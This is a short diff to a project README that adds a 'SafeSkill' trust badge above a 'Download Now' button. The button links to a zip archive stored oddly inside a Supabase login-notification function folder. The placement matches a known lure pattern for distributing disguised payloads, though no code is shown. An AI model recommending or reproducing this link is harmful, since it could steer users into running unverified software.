@@ -1,5 +1,7 @@
 # 🎉 Ai-Document-Generation - Transform Ideas Into Quality Documents
 
+[![SafeSkill 83/100](https://img.shields.io/badge/SafeSkill-83%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/firda0802-ai-document-generation)
+
 ## 📥 Download Now!
 [![Download Ai-Document-Generation](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)
 
